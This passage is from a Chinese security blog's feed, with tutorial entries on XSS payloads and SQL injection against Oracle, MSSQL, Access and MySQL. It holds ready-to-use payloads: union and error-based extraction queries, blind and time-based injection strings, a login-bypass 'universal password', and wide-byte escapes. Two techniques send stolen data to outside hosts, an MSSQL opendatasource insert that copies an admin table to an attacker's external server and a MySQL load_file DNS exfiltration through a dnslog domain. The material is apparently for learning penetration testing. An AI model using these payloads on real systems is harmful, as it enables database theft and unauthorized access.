src=javascript:alert(&apos;xss&apos;);height=0 width=0 /&gt;&lt;iframe&gt;  利用iframe的scr来弹窗  </span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;  过滤了alert来执行弹窗</span><br></pre></td></tr></table></figure></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 大雨连绵 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle注入</title>
      <link href="/2019/03/27/Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/03/27/Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h4 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识：**"></a>基础知识：**</h4><p>1.Oracle的数据类型是强匹配的(MYSQL有弱匹配的味道)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。</p><p>2.Oracle的单行注释符号是– ，多行注释符号/**/。</p><p><strong>Tips:</strong></p><p>Oracle中的dual表</p><ul><li>dual是oracle中的伪表 （之有一行一列）</li><li>每个用户都可以使用</li><li>也可能被删掉 sys可以恢复</li></ul><hr><h4 id="【union-注入】"><a href="#【union-注入】" class="headerlink" title="【union 注入】"></a><strong>【union 注入】</strong></h4><p>判断列数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; order by 3 --</span><br></pre></td></tr></table></figure><p>判断回显位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,null,null from dual --</span><br></pre></td></tr></table></figure><p>获取数据库版本信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select banner from sys.v_$version where rownum=1),null from dual --</span><br></pre></td></tr></table></figure><p>获取数据表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select table_name from user_tables where rownum=1),null from dual --</span><br><span class="line">&apos; union select null,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&apos;T_USER&apos;),null from dual --</span><br></pre></td></tr></table></figure><p>获取关键表中的列名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tab_columns where table_name=&apos;T_USER&apos; and rownum=1),null from dual --</span><br><span class="line">&apos; union select null,(select column_name from user_tab_columns where table_name=&apos;T_USER&apos;  and column_name&lt;&gt;&apos;SUSER&apos; and rownum=1),null from dual --</span><br><span class="line">&apos; union select null,(select column_name from user_tab_columns where table_name=&apos;T_USER&apos;  and column_name&lt;&gt;&apos;SUSER&apos; and column_name&lt;&gt;&apos;SPWD&apos; and rownum=1),null from dual --</span><br><span class="line">&apos; union select null,(select column_name from user_tab_columns where table_name=&apos;T_USER&apos;  and column_name&lt;&gt;&apos;SUSER&apos; and column_name&lt;&gt;&apos;SPWD&apos;  and column_name&lt;&gt;&apos;SNAME&apos; and rownum=1),null from dual --</span><br></pre></td></tr></table></figure><p>获取关键列中的字段数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select SNAME,SUSER,SPWD from T_USER --</span><br></pre></td></tr></table></figure><hr><h4 id="一些Oracle-报错注入："><a href="#一些Oracle-报错注入：" class="headerlink" title="一些Oracle 报错注入："></a><strong>一些Oracle 报错注入：</strong></h4><p>使用utl_inaddr.get_host_name()进行报错注入</p><p>使用XMLType()进行报错注入</p><p>使用dbms_xdb_version.checkin()进行报错注入</p><p>使用dbms_xdb_version.makeversioned()进报错注入</p><p>使用dbms_xdb_version.uncheckout()进行报错注入</p><p>使用dbms_utility.sqlid_to_sqlhash()进行报错注入</p><p>使用ordsys.ord_dicom.getmappingxpath()进行报错注入</p><p>使用decode进行报错注入，这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。</p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 冷淡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSQL反弹注入0.0</title>
      <link href="/2019/03/26/MSQL%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A50-0/"/>
      <url>/2019/03/26/MSQL%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A50-0/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p>用 id=2’ 进行测试，发现报错，显示 odbc_exec() :xxxx 的错误，说明用的是MSSQL数据库：**</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/mssql02.png" alt="又崩了"></p><p><strong>这里确实是存在注入点的，但用了几个测试语句都无法注入，也没有什么有价值的回显。所以这里就用上了反弹注入。</strong></p><hr><h4 id="反弹注入就是利用SQL-SERVER的opendatasource-函数，来将查询结果发送到另一个外网服务器的SQL-SERVER数据库中。"><a href="#反弹注入就是利用SQL-SERVER的opendatasource-函数，来将查询结果发送到另一个外网服务器的SQL-SERVER数据库中。" class="headerlink" title="反弹注入就是利用SQL SERVER的opendatasource() 函数，来将查询结果发送到另一个外网服务器的SQL SERVER数据库中。"></a><strong>反弹注入就是利用SQL SERVER的opendatasource() 函数，来将查询结果发送到另一个外网服务器的SQL SERVER数据库中。</strong></h4><hr><p><strong>首先在自己用来接收查询结果的外网服务器中，搭建好SQL SERVER数据库的环境，然后建立一个具有管理权限的数据库账户,然后使用建立的SQL账户登录数据库，这里使用查询分析器进行连接。</strong><br> <strong>用SQL语句建立一个数据库DB_14A8E32_ab：</strong></p><blockquote><p><strong>create database DB_14A8E32_ab;</strong></p></blockquote><p><strong>再在DB_14A8E32_ab数据库中建立biao表：</strong></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/mssql04.png" alt="真好！又坏了！"></p><p><strong>然后访问链接：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.203.13.75:8150/MSSQL/?id=2&apos;; insert into opendatasource(&apos;sqloledb&apos;,&apos;server=SQL5006.webweb.com,1433;uid=DB_14A8E32_ab_admin;pwd=123456789;datavase=DB_14A8E32_ab&apos;).DB_14A8E32_ab.dbo.biao select * from admin --</span><br></pre></td></tr></table></figure><p><strong>查看自己的数据库DB_14A8E32_ab中的biao表，获取到了我们想要查询的数据：</strong></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/mssql01.png" alt="太过分了！"></p><p><strong>回到SQL SERVER数据库查看查询记录：</strong></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/mssql03.png" alt="不搭"></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> benbenben </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Acccess偏移注入</title>
      <link href="/2019/03/25/Acccess%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/03/25/Acccess%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h4 id="偏移注入主要是针对知道表，但是不知道字段的。"><a href="#偏移注入主要是针对知道表，但是不知道字段的。" class="headerlink" title="偏移注入主要是针对知道表，但是不知道字段的。**"></a>偏移注入主要是针对知道表，但是不知道字段的。**</h4><p>​    <em>1:  这里已经知道了表名：admin</em></p><p>​        <em>2:  还有一个字段：admin</em></p><hr><h4 id="00x1-判断字段数"><a href="#00x1-判断字段数" class="headerlink" title="00x1 判断字段数"></a><strong>00x1 判断字段数</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/newslist.asp?id=688 order by 25  错误</span><br><span class="line">http://127.0.0.1/newslist.asp?id=688 order by 26  正确</span><br></pre></td></tr></table></figure><h4 id="00x2-判断表内存在的字段数"><a href="#00x2-判断表内存在的字段数" class="headerlink" title="00x2 判断表内存在的字段数"></a><strong>00x2 判断表内存在的字段数</strong></h4><p><strong>接下来我们利用“*”代替admin表内存在的字段，由于是26个字段数，需要逐步测试，直到返回正常。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,admin.* from admin  #错误</span><br><span class="line">http://127.0.0.1/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,admin.* from admin  #正确</span><br></pre></td></tr></table></figure><h4 id="00x4-爆出字段内容-偏移注入偷笑"><a href="#00x4-爆出字段内容-偏移注入偷笑" class="headerlink" title="00x4 爆出字段内容(偏移注入偷笑)"></a><strong>00x4 爆出字段内容</strong><code>(偏移注入偷笑)</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/newslist.asp?id=688 union select 1,2,3,4,5,6,7,admin.*,24,25,26 from admin  #错误</span><br><span class="line">http://127.0.0.1/newslist.asp?id=688 union select 1,2,3,4,5,6,admin.*,23,24,25,26 from admin  #正确</span><br></pre></td></tr></table></figure><hr><hr><hr></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 今天很沙漠 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL-Dns注入</title>
      <link href="/2019/03/22/MYSQL-Dns%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/03/22/MYSQL-Dns%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h3 id="知识哦！"><a href="#知识哦！" class="headerlink" title="知识哦！**"></a>知识哦！**</h3><p><strong>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息</strong><br><strong>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</strong></p><p><em>首先，你得有一个域名(like: abc.com)，搭建好vps环境，之后访问XXXXX.abc.com，dns服务会将此解析放入log记录中，之后我们可以通过查看log记录来获取之前select查询到的信息。</em></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/dns01.png" alt></p><hr><p><em>load_file读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。</em><br><em>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</em><br><em>在MySQL5.0.19，character_set_filesystem系统变量控制文件名的解释，即仅作文字字符串。</em></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file(concat(&apos;\\\\\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><em>concat是字符串拼接</em><br><em>database()就是你要做SQL注入查询的地方</em><br><em>‘.xxxx.ceye.io\abc’就是你的dnslog平台给你的域名</em><br><em>后面的abc可以改也可以不改，无所谓的，你乐意写啥就写啥</em></p><p><em>上面拼接的结果就是’\\ schema_name.XXXX.ceye.io\abc’，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了</em></p><p><em>然后查看ceye，成功获取到了数据库名称</em><br><em>对于表段，由于load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析。</em></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 啊哈哈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宽字节注入</title>
      <link href="/2019/03/22/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/03/22/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h4 id="宽字节原理介绍"><a href="#宽字节原理介绍" class="headerlink" title="宽字节原理介绍**"></a>宽字节原理介绍**</h4><hr><p><em>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将 ‘ 转换为 \’ 。因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：</em></p><p><em>1、%df 吃掉 \    具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</em></p><p><em>2、将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c给注释掉。</em></p><hr><h5 id="举个栗子："><a href="#举个栗子：" class="headerlink" title="举个栗子："></a><strong>举个栗子：</strong></h5><p><em>进行访问   注入   测试</em></p><p><img src="https://upload-images.jianshu.io/upload_images/1734768-0fd4e32b9028c232.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/501/format/webp" alt></p><p><em>发现已经被转义了，使用%df  ‘ 进行注入</em></p><p><img src="https://upload-images.jianshu.io/upload_images/1734768-7a2ab16df2e9fc3b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/504/format/webp" alt></p><p><em>继续注入   %df%27 union select  1,2,3   #</em></p><p><em>注意URL编码问题</em></p><p><img src="https://upload-images.jianshu.io/upload_images/1734768-dfe56a7b13d0b045.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/765/format/webp" alt></p><p><em>注入成功</em></p><p><em>以下为URL编码：</em></p><p><strong>%27———单引号</strong></p><p><strong>%20———-空格</strong></p><p><strong>%23———–#号</strong></p><p><strong>%5c————/反斜杠</strong></p><h3 id="为什么可以注入成功"><a href="#为什么可以注入成功" class="headerlink" title="为什么可以注入成功?"></a><strong>为什么可以注入成功?</strong></h3><p><em>修改一下   header  改为gbk</em></p><blockquote><p><em>header(“Content-type:text/html;charset=gbk”);</em></p></blockquote><p><img src="https:////upload-images.jianshu.io/upload_images/1734768-16f40d0edd186d58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/525/format/webp" alt="img"></p><p><em>id=1’———-&gt;id=1\’———&gt;id=1%5c%27</em></p><p><em>id=1%df’———id=1%df%5c%27———-&gt;id=1%DF5C%27——–&gt;id=1運’</em></p><p><em>其实就是利用gbk是多字节的编码，两个字节代表一个汉字</em></p><p><em>%df    %5c   组合出了一个  ’<strong>運 ‘</strong>字</em></p><hr><p>接下来就是常规SQL注入流程了。</p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL注入天书之盲注讲解</title>
      <link href="/2019/03/22/%E7%9B%B2%E6%B3%A8/"/>
      <url>/2019/03/22/%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显<br>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。*</p><hr><p>盲注分为三类</p><p>•基于布尔SQL盲注</p><p>•基于时间的SQL盲注</p><p>•基于报错的SQL盲注</p><hr><p><strong>1：基于布尔SQL盲注———-构造逻辑判断</strong></p><p>我们可以利用逻辑判断进行</p><p>截取字符串相关函数解析<a href="http://www.cnblogs.com/lcamry/p/5504374.html（这个还是要看下）" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5504374.html（这个还是要看下）</a></p><p>▲left(database(),1)&gt;’s’             //left()函数</p><p>Explain:database()显示数据库名称，left(a,b)从左侧截取a的前b位</p><p>▲ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 –+        //substr()函数，ascii()函数</p><p>Explain：substr(a,b,c)从b位置开始，截取字符串a的c长度。Ascii()将某个字符转换为ascii值</p><p>▲ascii(substr((select database()),1,1))=98</p><p>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23               //ORD()函数，MID()函数</p><p>Explain：mid(a,b,c)从位置b开始，截取a字符串的c位</p><p>Ord()函数同ascii()，将字符转为ascii值</p><p>▲regexp正则注入</p><p>正则注入介绍：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p><p>用法介绍：select user() regexp ‘^[a-z]’;</p><p>Explain：正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。</p><p>第二位可以用select user() regexp ‘^ro’来进行。</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/盲注01.png" alt="img"></p><p>当正确的时候显示结果为1，不正确的时候显示结果为0.</p><p>示例介绍：</p><p>I select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0));</p><p>IIselect * from users where id=1 and 1=(user() regexp’^ri’);</p><p>通过if语句的条件判断，返回一些条件句，比如if等构造一个判断。根据返回结果是否等于0或者1进行判断。</p><p>IIIselect * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p><p>这里利用select构造了一个判断语句。我们只需要更换regexp表达式即可</p><p>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE</p><p>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在无法判断的情况下，可以用table_name regexp ‘^username′来进行判断。是从开头进行匹配，′来进行判断。是从开头进行匹配，是从结尾开始判断。更多的语法可以参考mysql使用手册进行了解。</p><p>好，这里思考一个问题？有好几个，我们只得到了一个user，如何知道其他的？</p><p>这里可能会有人认为使用limit 0，1改为limit 1,1。</p><p>但是这种做法是错误的，limit作用在前面的select语句中，而不是regexp。那我们该如何选择。其实在regexp中我们是取匹配table_name中的内容，只要table_name中有的内容，我们用regexp都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。</p><p>▲like匹配注入</p><p>和上述的正则类似，mysql在匹配的时候我们可以用ike进行匹配。</p><p>用法：select user() like ‘ro%’</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/盲注02.png" alt="img"></p><p><strong>2：基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</strong></p><p>▲Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a;  </p><p>//explain:此处有三个点，一是需要concat计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。</p><p>以上语句可以简化成如下的形式。</p><p>select count(<em>) from information_schema.tables group by concat(version(),floor(rand(0)</em>2))</p><p>如果关键的表被禁用了，可以使用这种形式</p><p> select count(*) from (select 1 union select null union </p><p>select !1) group by concat(version(),floor(rand(0)*2)) </p><p>如果rand被禁用了可以使用用户变量来报错</p><p> select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</p><p>▲select exp(~(select * FROM(SELECT USER())a))         //double数值类型超出范围</p><p>  //Exp()为以e为底的对数函数；版本在5.5.5及其以上</p><p>可以参考exp报错文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p><p>▲select !(select * from (select user())x) -（ps:这是减号） ~0  </p><p> //bigint超出范围；~0是对0逐位取反，很大的版本在5.5.5及其以上</p><p>可以参考文章bigint溢出文章<a href="http://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p><p>▲extractvalue(1,concat(0x7e,(select @@version),0x7e))  se//mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p><p>▲updatexml(1,concat(0x7e,(select @@version),0x7e),1)   //mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p><p>▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</p><p>//mysql重复特性，此处重复了version，所以报错。</p><p><strong>3:基于时间的SQL盲注———-延时注入</strong></p><p>▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23  //if判断语句，条件为假，执行sleep</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ps：遇到以下这种利用sleep()延时注入语句</span><br><span class="line"></span><br><span class="line">select sleep(find_in_set(mid(@@version, 1, 1), &apos;0,1,2,3,4,5,6,7,8,9,.&apos;));</span><br><span class="line">该语句意思是在0-9之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</span><br></pre></td></tr></table></figure><p>▲UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</p><p>   //BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()</p><p>函数进行注入。</p><table><thead><tr><th>Mysql</th><th>BENCHMARK(100000,MD5(1))  or sleep(5)</th></tr></thead><tbody><tr><td>Postgresql</td><td>PG_SLEEP(5)   OR GENERATE_SERIES(1,10000)</td></tr><tr><td>Ms sql server</td><td>WAITFOR DELAY ‘0:0:5’</td></tr></tbody></table></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>POST注入</title>
      <link href="/2019/03/22/POST%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E5%88%86%E6%9E%90/"/>
      <url>/2019/03/22/POST%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h3 id="POST注入介绍"><a href="#POST注入介绍" class="headerlink" title=" POST注入介绍"></a><strong> POST注入介绍</strong></h3><hr><p><em>什么是 post 呢？就是数据从客户端提交到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，提交到服务器后服务器再进行验证。这就是一次 post 的过程的。</em></p><p><strong>如图所示</strong></p><p><img src="https://img-blog.csdn.net/20161115233841448" alt></p><hr><p><em>以账号<code>username</code>密码<code>password</code>登录为例</em></p><p><img src="https://img-blog.csdn.net/20161115234006857" alt></p><p><em>后台的SQL查询语句如下：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p><em>由于<code>$username</code>和​<code>$password</code> 都可以由用户输入，如果我们构造一些“恶意”的SQL语句，“欺骗”后台数据库执行系统不愿意用户执行的操作，那么就产生了SQL注入。这就是我们常说的POST注入。</em></p><p><em>最经典的POST注入莫过于“万能密码”。</em></p><p><code>username ：admin&#39; or &#39;1&#39;=&#39;1#</code></p><p><code>password ：*******（随意输入）</code></p><p><em>此时，后台数据库的查询语句为：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username, password FROM users WHERE username=&apos;admin&apos; or &apos;1&apos;=&apos;1 # and password=&apos;$password&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p><em>显而易见，’1’ = ‘1’恒为真，而且#后面的密码直接被注释了，那么我们可以直接登录到后台了。</em></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入原理分析</title>
      <link href="/2019/03/21/sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
      <url>/2019/03/21/sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p><strong><a href="https://baike.baidu.com/item/sql注入/150289?fr=aladdin" target="_blank" rel="noopener">点我了解sql注入哦</a></strong></p><p><em>SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</em></p><hr><p><em>为了更直观的让大家了解到sql注入的原理，贴上一张sql注入攻击示意图</em></p><hr><p><img src="https://img-blog.csdn.net/20180611101506631?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjM4NDk1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="sql注入就这样啦！"></p><p><strong>啦啦啦，sql注入意思就这样！</strong></p><hr><p><strong>SQL注入攻击的典型手段:</strong></p><ul><li><em>判断应用程序是否存在注入漏洞</em></li><li><em>收集信息、并判断数据库类型</em></li><li><em>根据注入参数类型，重构SQL语句的原貌</em></li><li><em>猜解表名、字段名</em></li><li><em>获取账户信息、攻击web或为下一步攻击做准备</em></li></ul><hr><p><strong>介绍几个常用系统函数：</strong></p><ol><li><p><em>version()——MySQL 版本</em></p></li><li><p><em>user()——数据库用户名</em></p></li><li><p><em>database()——数据库名</em></p></li><li><p><em>@@datadir——数据库路径</em></p></li><li><p><em>@@version_compile_os——操作系统版本</em></p><p><strong>字符串连接函数</strong><br><strong>函数具体介绍 <a href="http://www.cnblogs.com/lcamry/p/5715634.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/p/5715634.html</a></strong></p></li><li><p><em>concat(str1,str2,…)——没有分隔符地连接字符串</em></p></li><li><p><em>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</em></p></li><li><p>*group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</p></li></ol><p>  <strong>说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。<br>  一般用于尝试的语句<br>  Ps:–+可以用#替换，url 提交过程中 Url 编码后的#为%23</strong><br>  <em><code>or 1=1--+</code></em><br>  <em><code>&#39;or 1=1--+</code></em><br>  <em><code>&quot;or 1=1--+</code></em><br>  <em><code>)or 1=1--+</code></em><br>  <em><code>&#39;)or 1=1--+</code></em><br>  <em><code>&quot;) or 1=1--+</code></em><br>  <em><code>&quot;))or 1=1--+</code></em></p><p>  <em>一般的代码为：</em><br>  <em><code>$id=$_GET[&#39;id&#39;];</code></em><br>  <code>*$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;*</code><br>  <em>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思</em><br>  <em>路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</em></p><hr><p>  <em>Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的，<br>  我们利用该表可以进行一次完整的注入。以下为一般的流程。</em><br>  <em>猜数据库</em></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure><p>  <em>猜某库的数据表</em></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=’xxxxx’</span><br></pre></td></tr></table></figure><p>  <em>猜某表的所有列</em></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=’xxxxx’</span><br></pre></td></tr></table></figure><p>  <em>获取某列的内容</em></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select *** from ****</span><br></pre></td></tr></table></figure></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>正则小试牛刀</title>
      <link href="/2019/03/21/%E6%AD%A3%E5%88%99%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/"/>
      <url>/2019/03/21/%E6%AD%A3%E5%88%99%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/</url>
      
